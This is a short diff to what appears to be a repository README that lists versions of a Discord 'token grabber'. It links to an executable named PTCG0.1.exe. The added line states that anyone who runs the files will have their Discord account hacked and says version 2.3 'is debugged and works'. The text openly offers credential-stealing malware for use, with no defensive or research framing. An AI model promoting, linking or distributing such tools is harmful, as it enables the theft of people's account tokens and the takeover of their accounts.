@@ -1,6 +1,6 @@
 # VERSIONS:
 
-if someone run these files, they're discord will be hacked
+if someone run these files, they're discord will be hacked<br/>some of them might not work but `2.3` is debugged and works
 
 <a href="token%20grabber%20files/PTCG0.1.exe">PTCG0.1</a>
 <br/>
